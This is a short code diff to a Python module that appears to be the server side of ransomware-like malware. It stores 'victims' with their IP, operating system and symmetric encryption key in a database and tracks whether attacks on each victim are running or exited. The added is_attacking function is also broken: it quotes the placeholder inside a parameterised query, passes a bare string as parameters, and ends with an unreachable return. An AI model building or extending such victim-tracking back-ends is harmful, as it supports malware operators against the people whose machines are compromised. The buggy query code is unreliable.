@@ -112,8 +112,8 @@ def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
     #Insert du client en bdd
     else:
         print("\t(+) client added in database")
-        query = "INSERT INTO victims (uid, ip, os, status, sym_key, pub_key, stealth, multi_thread, created_at) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
-        values = (uid, ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True, datetime.now())
+        query = "INSERT INTO victims (uid, ip, os, status, sym_key, pub_key, created_at) VALUES (%s, %s, %s, %s, %s, %s, %s)"
+        values = (uid, ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), datetime.now())
         mycursor.execute(query, values)
 
     db.commit()
@@ -129,3 +129,26 @@ def update_status(db, mycursor, uid):
     mycursor.execute(query, values)
 
     db.commit() 
+
+
+def exit_attacks(db, mycursor, uid):
+    #Update du client en bdd
+    query = "UPDATE victim_attacks SET state = %s WHERE state = %s AND victim_id = (select id from victims where uid = %s);"
+    values = ("exited", "running", uid)
+
+    mycursor.execute(query, values)
+
+    db.commit()
+
+
+def is_attacking(mycursor, uid):
+    query = "select count(*) from victim_attacks where state = 'running' and victim_id = (select id from victims where uid = '%s');"
+    print("uid :", uid)
+    values = (str(uid))
+
+    mycursor.execute(query, values)
+    result = mycursor.fetchall()
+
+
+    return result[0][0] > 0
+    return True
